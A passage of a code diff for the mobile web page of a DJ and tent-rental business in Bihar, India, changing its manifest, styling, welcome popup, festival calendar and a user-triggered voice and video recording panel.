@@ -7,13 +7,9 @@
     <meta name="theme-color" content="#D4AF37">
     <meta name="mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <meta name="apple-mobile-web-app-title" content="MND Tent House">
     <meta name="application-name" content="MNDs Hub">
     
-    <!-- PWA Manifest Link -->
-    <link rel="manifest" href="manifest.json">
-    <link rel="apple-touch-icon" href="https://i.postimg.cc/76mz1v2j/file-0000000090a471fa84cbecd48a774885.png">
-    <link rel="icon" type="image/png" href="https://i.postimg.cc/76mz1v2j/file-0000000090a471fa84cbecd48a774885.png">
+    <link rel="manifest" href='data:application/manifest+json,{"name":"MND Secure Hub","short_name":"MND App","start_url":".","display":"standalone","background_color":"#050505","theme_color":"#D4AF37","orientation":"portrait","icons":[{"src":"https://i.postimg.cc/76mz1v2j/file-0000000090a471fa84cbecd48a774885.png","sizes":"192x192","type":"image/jpeg"},{"src":"https://i.postimg.cc/76mz1v2j/file-0000000090a471fa84cbecd48a774885.png","sizes":"512x512","type":"image/jpeg"}]}'>
 
     <title>Maa Nirmala DJ & Tent House | SECURE HUB</title>
     
@@ -50,115 +46,25 @@
         ::-webkit-scrollbar-thumb { background: var(--gold-primary); border-radius: 10px; }
         
         * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; outline: none; }
-        body { background-color: var(--bg-body); color: var(--text-main); font-family: 'Outfit', sans-serif; overflow-x: hidden; min-height: 100vh; transition: background-color 0.4s ease, color 0.4s ease; }
-
-        /* PWA Install Banner Styles */
-        #install-banner {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            background: rgba(10, 10, 10, 0.95);
-            backdrop-filter: blur(20px);
-            border-bottom: 2px solid var(--gold-primary);
-            padding: 15px 20px;
-            z-index: 99999;
-            justify-content: space-between;
-            align-items: center;
-            gap: 15px;
-            animation: slideDown 0.4s ease-out;
-        }
-
-        #install-banner.show {
-            display: flex;
-        }
-
-        @keyframes slideDown {
-            from {
-                transform: translateY(-100%);
-                opacity: 0;
-            }
-            to {
-                transform: translateY(0);
-                opacity: 1;
-            }
-        }
-
-        .install-banner-content {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            flex-grow: 1;
-        }
-
-        .install-banner-icon {
-            width: 40px;
-            height: 40px;
-            border-radius: 8px;
-            background: linear-gradient(135deg, var(--gold-primary), #FFD700);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: #000;
-            font-size: 18px;
-            flex-shrink: 0;
-        }
-
-        .install-banner-text h4 {
-            margin: 0;
-            color: var(--gold-primary);
-            font-size: 14px;
-            font-weight: bold;
-            font-family: 'Cinzel';
-        }
-
-        .install-banner-text p {
-            margin: 2px 0 0 0;
-            color: #aaa;
-            font-size: 11px;
-        }
-
-        .install-banner-buttons {
-            display: flex;
-            gap: 8px;
-            flex-shrink: 0;
-        }
-
-        .install-btn {
-            background: var(--gold-primary);
-            color: #000;
-            border: none;
-            padding: 8px 16px;
-            border-radius: 6px;
-            font-weight: bold;
-            cursor: pointer;
-            font-size: 12px;
-            transition: 0.3s;
-        }
-
-        .install-btn:hover {
-            transform: scale(1.05);
-            box-shadow: 0 0 15px var(--gold-primary);
-        }
-
-        .install-close {
-            background: transparent;
-            border: none;
-            color: #888;
-            font-size: 18px;
-            cursor: pointer;
-            padding: 5px;
-            transition: 0.3s;
-        }
-
-        .install-close:hover {
-            color: var(--gold-primary);
-        }
+        body { background-color: var(--bg-body); color: var(--text-main); font-family: 'Outfit', sans-serif; overflow-x: hidden; min-height: 100vh; transition: background-color 0.4s ease, color 0.4s ease; user-select: none; }
 
         /* GATEKEEPER */
-        #gatekeeper { position: fixed; inset: 0; z-index: 9999; background: var(--bg-body); display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; text-align: center; }
-        .gate-card { width: 100%; max-width: 400px; max-height: 85vh; background: rgba(10, 10, 10, 0.95); border: 1px solid var(--gold-primary); border-radius: 20px; padding: 40px 25px; box-shadow: 0 0 80px rgba(212, 175, 55, 0.15); backdrop-filter: blur(20px); position: relative; overflow-y: auto; overflow-x: hidden; animation: pulseCard 4s infinite alternate; }
+        #gatekeeper { position: fixed; inset: 0; z-index: 9999; background: var(--bg-body); display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; text-align: center; background-image: radial-gradient(circle at 50% 50%, rgba(212, 175, 55, 0.1) 0%, transparent 80%); transition: opacity 0.8s ease, visibility 0.8s; }
+        .gate-card {
+    width: 100%; 
+    max-width: 400px;
+    max-height: 85vh; /* ADDED: Limits the box height so it doesn't push off-screen */
+    background: rgba(10, 10, 10, 0.95);
+    border: 1px solid var(--gold-primary);
+    border-radius: 20px; 
+    padding: 40px 25px;
+    box-shadow: 0 0 80px rgba(212, 175, 55, 0.15);
+    backdrop-filter: blur(20px);
+    position: relative; 
+    overflow-y: auto; /* CHANGED: Enables vertical manual scrolling inside the box */
+    overflow-x: hidden; /* ADDED: Keeps the horizontal layout neat */
+    animation: pulseCard 4s infinite alternate;
+}
         @keyframes pulseCard { from { transform: scale(1); border-color: rgba(212,175,55,0.3); } to { transform: scale(1.005); border-color: rgba(212,175,55,0.6); } }
         .gate-img-frame { width: 110px; height: 110px; margin: 0 auto 20px; border-radius: 50%; padding: 3px; border: 2px solid var(--gold-primary); box-shadow: 0 0 30px rgba(212, 175, 55, 0.3); }
         .gate-img { width: 100%; height: 100%; border-radius: 50%; object-fit: cover; }
@@ -169,7 +75,7 @@
         .gate-input:focus { border-color: var(--gold-primary); background: rgba(212, 175, 55, 0.08); box-shadow: 0 0 15px rgba(212,175,55,0.1); }
         .gate-icon { position: absolute; left: 15px; top: 17px; color: #555; transition: 0.3s; }
         .gate-input:focus + .gate-icon { color: var(--gold-primary); }
-        .gate-btn { width: 100%; padding: 16px; background: linear-gradient(135deg, var(--gold-primary), #997d2d); color: #000; font-weight: 800; font-size: 16px; border: none; cursor: pointer; border-radius: 10px; transition: 0.3s; }
+        .gate-btn { width: 100%; padding: 16px; background: linear-gradient(135deg, var(--gold-primary), #997d2d); color: #000; font-weight: 800; font-size: 16px; border: none; cursor: pointer; border-radius: 10px; text-transform: uppercase; letter-spacing: 2px; margin-top: 15px; box-shadow: 0 5px 25px rgba(212, 175, 55, 0.3); transition: 0.3s; }
         .gate-btn:active { transform: scale(0.98); }
         .loading-text { margin-top: 20px; font-size: 12px; color: var(--gold-primary); font-family: 'Rajdhani'; display: none; letter-spacing: 1px; font-weight: bold; }
 
@@ -182,66 +88,134 @@
         @keyframes float { 0% { transform: translate(0,0); } 100% { transform: translate(50px, 50px); } }
 
         /* Navbar & Hamburger */
-        .navbar { display: flex; justify-content: space-between; align-items: center; padding: 15px 5%; position: sticky; top: 0; z-index: 1000; background: rgba(5, 5, 5, 0.85); backdrop-filter: var(--nav-glass); border-bottom: 1px solid var(--border-color); }
+        .navbar { display: flex; justify-content: space-between; align-items: center; padding: 15px 5%; position: sticky; top: 0; z-index: 1000; background: rgba(5, 5, 5, 0.85); backdrop-filter: var(--glass-blur); border-bottom: 1px solid var(--border-color); }
         .brand { font-family: 'Cinzel'; color: var(--gold-primary); font-weight: 700; font-size: 18px; display: flex; align-items: center; gap: 12px; }
         .controls { display: flex; align-items: center; gap: 15px; }
         .nav-btn { font-size: 20px; cursor: pointer; color: var(--text-main); background: none; border: none; }
 
         .menu-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.7); z-index: 5999; display: none; opacity: 0; transition: 0.3s; }
         .menu-overlay.active { display: block; opacity: 1; }
-        .side-menu { position: fixed; top: 0; left: -280px; width: 260px; height: 100%; background: rgba(10,10,10,0.98); border-right: 1px solid var(--gold-primary); z-index: 6000; transition: left 0.3s ease; }
+        .side-menu { position: fixed; top: 0; left: -280px; width: 260px; height: 100%; background: rgba(10,10,10,0.98); border-right: 1px solid var(--gold-primary); z-index: 6000; transition: left 0.4s ease; padding-top: 20px; display: flex; flex-direction: column; box-shadow: 5px 0 30px rgba(0,0,0,0.5); overflow-y: auto;}
         .side-menu.open { left: 0; }
         .menu-close { align-self: flex-end; margin: 0 20px 20px 0; font-size: 24px; color: var(--gold-primary); cursor: pointer; }
-        .side-link { display: flex; align-items: center; padding: 18px 25px; color: #fff; text-decoration: none; border-bottom: 1px solid #222; font-family: 'Outfit'; font-size: 15px; font-weight: 500; transition: 0.3s; }
+        .side-link { display: flex; align-items: center; padding: 18px 25px; color: #fff; text-decoration: none; border-bottom: 1px solid #222; font-family: 'Outfit'; font-size: 15px; font-weight: 600; text-transform: uppercase; letter-spacing: 1px; transition: 0.3s; }
         .side-link i { color: var(--gold-primary); margin-right: 15px; font-size: 18px; width: 20px; text-align: center; }
         .side-link:hover { background: rgba(212,175,55,0.1); padding-left: 30px; }
         .menu-logo { text-align: center; padding-bottom: 20px; border-bottom: 1px solid var(--border-color); margin-bottom: 10px; }
         .menu-logo img { width: 80px; height: 80px; border-radius: 50%; border: 2px solid var(--gold-primary); }
 
+        #google_translate_element { margin-right: 5px; }
+        .goog-te-gadget-simple { background-color: rgba(255,255,255,0.05) !important; border: 1px solid var(--gold-primary) !important; padding: 4px 8px !important; border-radius: 20px !important; }
+        .goog-te-gadget-simple span { color: var(--gold-primary) !important; font-weight: 700 !important; font-size: 11px !important; }
+        .goog-te-gadget-icon, .goog-te-banner-frame { display: none !important; } body { top: 0px !important; }
+
         /* Profile Section */
         .container { width: 100%; max-width: 800px; margin: 0 auto; padding: 0 20px; }
         .profile-wrapper { text-align: center; padding: 60px 0 30px; }
-        .img-container { width: 160px; height: 160px; margin: 0 auto 20px; position: relative; border-radius: 50%; padding: 5px; background: linear-gradient(135deg, var(--gold-primary), transparent); }
+        .img-container { width: 160px; height: 160px; margin: 0 auto 20px; position: relative; border-radius: 50%; padding: 5px; background: linear-gradient(135deg, var(--gold-primary), transparent, var(--gold-shine)); }
         .profile-pic { width: 100%; height: 100%; border-radius: 50%; object-fit: cover; border: 4px solid var(--bg-body); background: #000; }
         h1 { font-family: 'Rajdhani', sans-serif; font-size: 32px; font-weight: 700; background: linear-gradient(to right, var(--text-main), var(--gold-primary), var(--text-main)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 5px; }
         .verified { color: #1DA1F2; font-size: 20px; vertical-align: middle; margin-left: 5px; }
         .bio { color: var(--gold-primary); font-size: 13px; letter-spacing: 2px; font-weight: 600; text-transform: uppercase; }
 
-        /* Welcome & Content */
-        .welcome-popup { display: flex; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(0,0,0,0.85); z-index: 999999999; justify-content: center; align-items: center; animation: fadeIn 0.3s ease; }
-        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        #installBtn { display: none; margin: 20px auto; background: rgba(212, 175, 55, 0.1); border: 1px solid var(--gold-primary); color: var(--gold-primary); padding: 12px 30px; border-radius: 30px; font-size: 12px; font-weight: bold; cursor: pointer; box-shadow: 0 0 20px rgba(212, 175, 55, 0.15); animation: bounce 2s infinite; letter-spacing: 1px; }
+        @keyframes bounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-5px); } }
+
+        /* Grids & Sections */
+        .section-label { display: flex; align-items: center; gap: 10px; margin: 35px 0 15px; color: var(--gold-primary); font-family: 'Cinzel'; font-weight: bold; font-size: 14px; border-bottom: 1px solid var(--border-color); padding-bottom: 8px; text-transform: uppercase; scroll-margin-top: 80px; }
+        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
+        @media (min-width: 600px) { .grid { gap: 20px; } }
         
-        .welcome-box { background: linear-gradient(135deg, #110e08 0%, #050505 100%); border: 2px solid #D4AF37; border-radius: 20px; padding: 30px; text-align: center; width: 92%; max-width: 450px; box-shadow: 0 20px 60px rgba(0,0,0,0.9); position: relative; animation: popIn 0.4s ease; }
-        @keyframes popIn { from { opacity: 0; transform: scale(0.9); } to { opacity: 1; transform: scale(1); } }
+        .card { background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 16px; padding: 20px; height: 100px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-decoration: none; color: var(--text-main); position: relative; overflow: hidden; backdrop-filter: var(--glass-blur); box-shadow: 0 4px 15px rgba(0,0,0,0.1); transition: all 0.3s; }
+        .card:active { transform: scale(0.96); border-color: var(--gold-shine); }
+        .card i { font-size: 28px; margin-bottom: 8px; color: var(--gold-primary); transition: 0.3s; }
+        .card span { font-size: 11px; font-weight: 600; text-transform: uppercase; text-align: center; }
+        .full-w { grid-column: span 2; flex-direction: row; gap: 15px; height: 75px; background: linear-gradient(90deg, rgba(212,175,55,0.05), transparent); }
+        .full-w i { margin-bottom: 0; font-size: 24px; }
+
+        .img-card { background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 16px; padding: 10px; aspect-ratio: 1 / 1; display: flex; flex-direction: column; align-items: center; justify-content: space-between; text-decoration: none; color: var(--text-main); position: relative; overflow: hidden; backdrop-filter: var(--glass-blur); box-shadow: 0 4px 15px rgba(0,0,0,0.3); transition: all 0.3s; }
+        .img-card:active { transform: scale(0.96); border-color: var(--gold-shine); }
+        .img-card img { width: 100%; height: 75%; object-fit: cover; border-radius: 10px; border: 1px solid rgba(212,175,55,0.3); }
+        .img-card span { font-size: 12px; font-weight: 700; text-transform: uppercase; text-align: center; color: var(--gold-primary); margin-top: 5px; font-family: 'Rajdhani'; letter-spacing: 1px; }
+
+        /* LIVE FEED GALLERY CARDS (LARGE) */
+        .feed-container { display: flex; flex-direction: column; gap: 20px; }
+        .feed-card { background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 20px; padding: 20px; box-shadow: 0 8px 25px rgba(0,0,0,0.4); text-align: left; }
+        .feed-badge { display: inline-block; background: var(--gold-primary); color: #000; padding: 4px 10px; border-radius: 20px; font-size: 11px; font-weight: bold; margin-bottom: 12px; text-transform: uppercase; letter-spacing: 1px; }
+        .feed-media { width: 100%; border-radius: 12px; border: 2px solid rgba(212,175,55,0.2); margin-bottom: 15px; background: #000; object-fit: contain; }
+        .feed-img { max-height: 400px; }
+        .feed-video { height: 250px; }
+        .feed-audio { width: 100%; margin-bottom: 15px; outline: none; border-radius: 30px; }
+        .feed-text { font-size: 15px; color: #fff; line-height: 1.6; font-family: 'Outfit'; }
+        .feed-offer { font-size: 18px; color: var(--gold-shine); font-weight: bold; font-family: 'Cinzel'; text-align: center; padding: 20px; border: 1px dashed var(--gold-primary); border-radius: 12px; background: rgba(212,175,55,0.05); }
+
+        /* Sliders */
+        .slider-container { display: flex; overflow-x: auto; gap: 15px; padding-bottom: 15px; scroll-snap-type: x mandatory; scrollbar-width: none; }
+        .slider-container::-webkit-scrollbar { display: none; }
+        .slide-card { flex: 0 0 85%; scroll-snap-align: center; background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 16px; overflow: hidden; position: relative; box-shadow: 0 5px 20px rgba(0,0,0,0.2); }
+        .slide-card img { width: 100%; height: 220px; object-fit: cover; display: block; border-bottom: 2px solid var(--gold-primary); }
+        .slide-info { padding: 15px; text-align: center; background: linear-gradient(0deg, #000, transparent); }
+        .slide-info h3 { color: var(--gold-primary); font-family: 'Rajdhani'; font-size: 18px; text-transform: uppercase; letter-spacing: 1px; }
+
+        /* Team Cards */
+        .team-card { flex: 0 0 85%; scroll-snap-align: center; text-align:center; background:var(--bg-card); border-radius:26px; border: 1px solid var(--border-color); padding: 30px 15px; box-shadow: 0 5px 20px rgba(0,0,0,0.2); }
+        .team-card img { width: 130px; height: 130px; object-fit:cover; border-radius:50%; border:3px solid var(--gold-primary); margin-bottom:15px; }
+        .team-card h1 { font-size:24px; font-weight:800; margin:5px 0; background:linear-gradient(90deg,#FFD700,#D4AF37,#FFD700); -webkit-background-clip:text; -webkit-text-fill-color:transparent; font-family: 'Rajdhani'; }
+        .team-card h3 { font-size:14px; color: var(--gold-primary); margin-bottom: 15px; text-transform: uppercase; letter-spacing: 1px; }
+        .team-card p { font-size:13px; line-height:1.6; color:#eaeaea; margin-bottom:10px; }
+
+        /* Map Container */
+        .map-container { background: var(--bg-card); padding: 15px; border-radius: 20px; border: 1px solid var(--border-color); box-shadow: 0 5px 20px rgba(0,0,0,0.2); }
+        .map-wrapper { width: 100%; aspect-ratio: 1 / 1; border-radius: 12px; overflow: hidden; border: 2px solid var(--gold-primary); }
+
+        /* Owner Profile */
+        .owner-profile { background:var(--bg-card); border-radius:26px; border: 1px solid var(--border-color); padding: 30px 20px; box-shadow: 0 5px 20px rgba(0,0,0,0.2); margin-bottom: 30px; }
+
+        /* Bottom Nav */
+        .bottom-nav { position: fixed; bottom: 0; left: 0; width: 100%; height: 75px; background: rgba(5, 5, 5, 0.95); backdrop-filter: var(--nav-glass); border-top: 1px solid var(--border-color); z-index: 4000; display: flex; justify-content: space-around; align-items: center; }
+        .nav-item { flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; color: var(--text-sub); gap: 4px; cursor: pointer; transition: 0.3s; }
+        .nav-item.active { color: var(--gold-primary); }
+        .nav-item.active i { transform: translateY(-3px); text-shadow: 0 0 15px var(--gold-primary); }
+
+        .ai-trigger { position: fixed; bottom: 90px; right: 25px; width: 60px; height: 60px; border-radius: 50%; background: linear-gradient(135deg, var(--gold-primary), #997d2d); display: flex; align-items: center; justify-content: center; box-shadow: 0 0 30px rgba(212,175,55,0.4); z-index: 2000; cursor: pointer; animation: pulse 3s infinite; }
+        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
+
+        /* Modals & Forms */
+        .modal-wrap { position: fixed; inset: 0; background: rgba(0,0,0,0.85); z-index: 5000; display: none; align-items: center; justify-content: center; backdrop-filter: blur(8px); opacity: 0; transition: opacity 0.3s; }
+        .modal-wrap.active { opacity: 1; display: flex; }
+        .modal-inner { width: 92%; max-width: 450px; background: #080808; border: 1px solid var(--gold-primary); border-radius: 20px; overflow: hidden; display: flex; flex-direction: column; box-shadow: 0 0 60px rgba(212,175,55,0.15); max-height: 85vh; }
         
-        .close-btn { position: absolute; top: 15px; right: 20px; color: #D4AF37; font-size: 35px; cursor: pointer; transition: 0.3s; }
-        .close-btn:hover { color: #fff; }
+        .book-area { padding: 20px; overflow-y: auto; text-align: left; }
+        .f-group { margin-bottom: 12px; }
+        .f-label { display: block; color: var(--gold-primary); font-size: 11px; margin-bottom: 5px; text-transform: uppercase; font-weight: bold; font-family: 'Rajdhani'; letter-spacing: 1px; }
+        .f-input { width: 100%; padding: 12px; background: rgba(255,255,255,0.05); border: 1px solid #333; color: #fff; border-radius: 8px; font-family: 'Outfit'; font-size: 14px; }
+        .f-input:focus { border-color: var(--gold-primary); outline: none; background: rgba(212,175,55,0.05); }
+        .f-btn { width: 100%; padding: 15px; background: var(--gold-primary); color: #000; font-weight: 800; border: none; border-radius: 8px; cursor: pointer; text-transform: uppercase; margin-top: 10px; font-size: 16px; transition: 0.3s; }
+        .f-btn:active { transform: scale(0.98); }
+
+        .loc-group { border: 1px dashed var(--gold-primary); padding: 15px; border-radius: 12px; margin-bottom: 15px; background: rgba(212,175,55,0.02); }
+        .loc-title { color: var(--gold-primary); font-family: 'Cinzel'; font-size: 12px; font-weight: bold; margin-bottom: 15px; display: block; letter-spacing: 1px; text-align: center; }
+
+        .star-rating { display: flex; flex-direction: row-reverse; justify-content: center; gap: 8px; margin: 15px 0 25px; }
+        .star-rating input { display: none; }
+        .star-rating label { font-size: 35px; color: #333; cursor: pointer; transition: 0.2s; text-shadow: 0 0 10px rgba(0,0,0,0.5); }
+        .star-rating input:checked ~ label, .star-rating label:hover, .star-rating label:hover ~ label { color: var(--gold-shine); text-shadow: 0 0 15px var(--gold-primary); }
+
+        .chat-box { height: 350px; padding: 20px; overflow-y: auto; background: #0a0a0a; display: flex; flex-direction: column; gap: 10px; }
+        .bubble { padding: 10px 15px; border-radius: 12px; max-width: 80%; font-size: 13px; line-height: 1.4; }
+        .bubble.bot { background: rgba(212,175,55,0.15); border: 1px solid rgba(212,175,55,0.3); color: #fff; align-self: flex-start; border-bottom-left-radius: 2px;}
+        .bubble.user { background: #333; color: #fff; align-self: flex-end; border-bottom-right-radius: 2px; }
+        .toast { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); background: var(--gold-primary); color: #000; padding: 10px 20px; border-radius: 30px; font-weight: bold; font-size: 12px; opacity: 0; pointer-events: none; transition: 0.3s; z-index: 6000; }
+        .toast.show { opacity: 1; top: 40px; }
+        
+        /* Pricing Cards */
+        .price-card { background: rgba(255,255,255,0.05); border: 1px solid var(--border-color); border-radius: 12px; padding: 15px; margin-bottom: 15px; display: flex; justify-content: space-between; align-items: center; }
+        .price-title { font-family: 'Cinzel'; font-weight: bold; font-size: 16px; color: #fff; }
+        .price-amt { color: var(--gold-primary); font-size: 20px; font-weight: bold; font-family: 'Rajdhani'; }
     </style>
 </head>
 <body data-theme="dark">
 
-    <!-- PWA Install Banner -->
-    <div id="install-banner">
-        <div class="install-banner-content">
-            <div class="install-banner-icon">
-                <i class="fas fa-download"></i>
-            </div>
-            <div class="install-banner-text">
-                <h4>🎉 Install MND App</h4>
-                <p>Add to your home screen for quick access</p>
-            </div>
-        </div>
-        <div class="install-banner-buttons">
-            <button class="install-btn" onclick="installPWA()">
-                <i class="fas fa-plus"></i> Install
-            </button>
-            <button class="install-close" onclick="dismissInstallBanner()">
-                <i class="fas fa-times"></i>
-            </button>
-        </div>
-    </div>
-
-    <!-- GATEKEEPER -->
     <div id="gatekeeper">
         <div class="gate-card">
             <div class="gate-img-frame"><img src="https://i.postimg.cc/76mz1v2j/file-0000000090a471fa84cbecd48a774885.png" class="gate-img" alt="Profile"></div>
@@ -254,119 +228,5241 @@
         </div>
     </div>
 
-    <!-- WELCOME POPUP -->
-    <div id="royalWelcomePopup" class="welcome-popup" style="display:none;">
-        <div class="welcome-box">
-            <span class="close-btn" onclick="document.getElementById('royalWelcomePopup').style.display='none'">&times;</span>
-            <div style="color:#D4AF37; font-size:16px; line-height:1.6; font-family:'Cinzel', serif; font-weight:bold;">
-                ━━━━━━━━━━━━━<br>
-                <span style="font-size:26px; color:#fff; text-shadow:0 0 10px #D4AF37; line-height: 1.2;">🎉 WELCOME TO 🎉</span><br>
-                <span style="font-size:30px; color:#FFD700; text-shadow:0 0 20px #FFD700; line-height: 1.2;"> MAA NIRMALA DJ </span><br>
-                ━━━━━━━━━━━━━━━
+    <div class="menu-overlay" id="menuOverlay" onclick="toggleMenu()"></div>
+    <div class="side-menu" id="sideMenu">
+        <i class="fas fa-times menu-close" onclick="toggleMenu()"></i>
+        <div class="menu-logo">
+            <img src="https://i.postimg.cc/76mz1v2j/file-0000000090a471fa84cbecd48a774885.png" alt="Logo">
+            <div style="color:var(--gold-primary); font-family:'Cinzel'; font-weight:bold; margin-top:5px;">MNDs Hub</div>
+        </div>
+        <a href="#" class="side-link" onclick="toggleMenu(); navAction('home')"><i class="fas fa-home"></i> Home</a>
+       <a href="javascript:void(0)" class="side-link premium-animated-btn" onclick="toggleMenu(); openMasterSettings()">
+    <i class="fas fa-cogs fa-spin"></i> Master Settings
+</a>
+<a href="javascript:void(0)" class="side-link" onclick="toggleMenu(); openCalendarModal()">
+    <i class="fas fa-calendar-day"></i> Indian Festival Calendar
+</a>
+
+<div id="royalWelcomePopup" style="display:flex; position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(0,0,0,0.85); z-index:999999999; justify-content:center; align-items:center; backdrop-filter:blur(15px); animation:fadeInOverlay 0.5s ease;">
+    <div style="background:linear-gradient(135deg, #110e08 0%, #050505 100%); border:2px solid #D4AF37; border-radius:20px; padding:30px; text-align:center; width:92%; max-width:450px; box-shadow:0 20px 60px rgba(212,175,55,0.4); position:relative; animation:slideUpZoom 0.5s ease;">
+        <span onclick="document.getElementById('royalWelcomePopup').style.display='none'" style="position:absolute; top:15px; right:20px; color:#D4AF37; font-size:35px; cursor:pointer;">&times;</span>
+        <div style="color:#D4AF37; font-size:16px; line-height:1.6; font-family:'Cinzel', serif; font-weight:bold;">
+             ━━━━━━━━━━━━━<br>
+            <span style="font-size:26px; color:#fff; text-shadow:0 0 10px #D4AF37; line-height: 1.2;">🎉 WELCOME TO 🎉</span><br>
+            <span style="font-size:30px; color:#FFD700; text-shadow:0 0 20px #FFD700; line-height: 1.2;"> MAA NIRMALA DJ </span><br>
+            ━━━━━━━━━━━━━━━
+        </div>
+        <div style="color:#ddd; font-family:'Outfit', sans-serif; font-size:15px; text-align:left; margin-top:25px; line-height:2;">
+            <i class="fas fa-volume-up" style="color:#D4AF37; width:20px;"></i> <b>Powerful Sound System</b><br>
+            <i class="fas fa-lightbulb" style="color:#D4AF37; width:20px;"></i> <b>Premium Lighting & DJ Effects</b><br>
+            <i class="fas fa-music" style="color:#D4AF37; width:20px;"></i> <b>Unforgettable Vibes for Every Event</b><br>
+            <i class="fas fa-gift" style="color:#ff3333; width:20px;"></i> <b style="color:#ff3333;">Special Gate Offer Available!</b><br>
+            <i class="fas fa-hand-point-right" style="color:#D4AF37; width:20px;"></i> <b>Book Now & Make Your Event Grand</b>
+        </div>
+        <div style="margin-top: 25px; padding-top: 20px; border-top: 1px dashed rgba(212,175,55,0.4); text-align: center;">
+            <p style="color:#D4AF37; font-family:'Cinzel'; font-weight:bold; font-size:18px; margin:0 0 10px 0;">📞 Contact / Booking:</p>
+            <a href="tel:+917294969938" style="display:inline-block; background:#25D366; color:#fff; padding:10px 25px; border-radius:30px; text-decoration:none; font-weight:bold; font-family:'Outfit'; font-size:18px; box-shadow:0 5px 15px rgba(37, 211, 102, 0.4); margin-bottom:15px;"><i class="fas fa-phone-alt"></i> 📲 7294969938</a>
+            <p style="color:#aaa; font-family:'Outfit'; font-size:12px; line-height:1.5; margin:0;">
+                <i class="fas fa-map-marker-alt" style="color:#ff3333;"></i> <b>Address:</b><br>
+                Tola Beltikri, Kaddhar, Katoria, Banka, Bihar, India (813106)
+            </p>
+        </div>
+    </div>
+</div>
+
+<div id="calendarModalOverlay" style="display:none; position:fixed; top:0; left:0; width:100vw; height:100vh; background:#050505; z-index:9999999; justify-content:center; align-items:center;">
+    <div style="width:100%; height:100%; border:none; background:linear-gradient(145deg, #110e08 0%, #050505 100%); display:flex; flex-direction:column;">
+        <div style="padding:20px; text-align:center; border-bottom:1px solid rgba(212,175,55,0.3); background:rgba(10,10,10,0.9); position:sticky; top:0;">
+            <span onclick="document.getElementById('calendarModalOverlay').style.display='none'" style="position:absolute; top:15px; right:20px; color:#D4AF37; font-size:35px; cursor:pointer;">&times;</span>
+            <h2 style="margin:0; color:#D4AF37; font-family:'Cinzel', serif; font-size:22px; font-weight:900;"><i class="fas fa-calendar-alt"></i> Grand Indian Calendar</h2>
+        </div>
+        <div style="flex-grow:1; overflow-y:auto; padding:20px;" id="calendarListArea">
             </div>
-            <div style="color:#ddd; font-family:'Outfit', sans-serif; font-size:15px; text-align:left; margin-top:25px; line-height:2;">
-                <i class="fas fa-volume-up" style="color:#D4AF37; width:20px;"></i> <b>Powerful Sound System</b><br>
-                <i class="fas fa-lightbulb" style="color:#D4AF37; width:20px;"></i> <b>Premium Lighting & DJ Effects</b><br>
-                <i class="fas fa-music" style="color:#D4AF37; width:20px;"></i> <b>Unforgettable Vibes for Every Event</b><br>
-                <i class="fas fa-gift" style="color:#ff3333; width:20px;"></i> <b style="color:#ff3333;">Special Gate Offer Available!</b><br>
-                <i class="fas fa-hand-point-right" style="color:#D4AF37; width:20px;"></i> <b>Book Now & Make Your Event Grand</b>
+    </div>
+</div>
+
+<div id="masterSettingsOverlay" style="display:none; position:fixed; top:0; left:0; width:100vw; height:100vh; background:#050505; z-index:9999999; justify-content:center; align-items:center;">
+    <div class="mn-master-box" style="width:100%; height:100%; border:none; border-radius:0; background:linear-gradient(145deg, #110e08 0%, #050505 100%); display:flex; flex-direction:column; overflow:hidden;">
+        
+        <div class="master-header" style="padding:20px; text-align:center; border-bottom:1px solid rgba(212,175,55,0.3); background:rgba(10,10,10,0.9); position:sticky; top:0; z-index:10;">
+            <span onclick="closeMasterSettings()" style="position:absolute; top:15px; right:20px; color:#D4AF37; font-size:35px; cursor:pointer;">&times;</span>
+            <h2 style="margin:0; color:#D4AF37; font-family:'Cinzel', serif; font-size:22px; font-weight:900; letter-spacing:1px;"><i class="fas fa-sliders-h"></i> Ultimate Control Center</h2>
+        </div>
+        
+        <div class="master-content" style="flex-grow:1; overflow-y:auto; padding:20px; padding-bottom:50px;">
+
+            <div class="settings-category">
+                <h3><i class="fas fa-satellite-dish"></i> Direct Telegram Studio Vault</h3>
+                <input type="text" id="mediaName" class="mn-input" placeholder="Your Name (Mandatory)" style="width:100%; margin-bottom:10px;">
+                <input type="tel" id="mediaNum" class="mn-input" placeholder="Your Phone (Mandatory)" style="width:100%; margin-bottom:15px;">
+                
+                <video id="cameraPreview" autoplay muted playsinline style="display:none; width:100%; height:250px; object-fit:cover; border-radius:12px; border:2px solid #ff3333; margin-bottom:10px;"></video>
+                
+                <div style="display: flex; width: 100%; gap: 10px; margin-bottom: 10px;">
+                    <button class="mn-btn" style="background:#0088cc; color:#fff; flex:1;" id="btnVoice" onclick="startVoiceRecord()"><i class="fas fa-microphone"></i> Voice Record</button>
+                    <button class="mn-btn" style="background:#ff3333; color:#fff; flex:1;" id="btnVideo" onclick="startVideoRecord()"><i class="fas fa-video"></i> Video (50s)</button>
+                    <button class="mn-btn" style="background:#444; color:#fff;" id="btnFlipCam" onclick="switchCamera()"><i class="fas fa-sync-alt"></i></button>
+                </div>
+                
+                <button id="stopRecordBtn" style="display:none; width:100%; padding:15px; background:#ff0000; color:#fff; font-weight:bold; font-size:16px; border:none; border-radius:8px; margin-bottom:10px; animation: flashRed 1s infinite;" onclick="stopMediaRecording()">
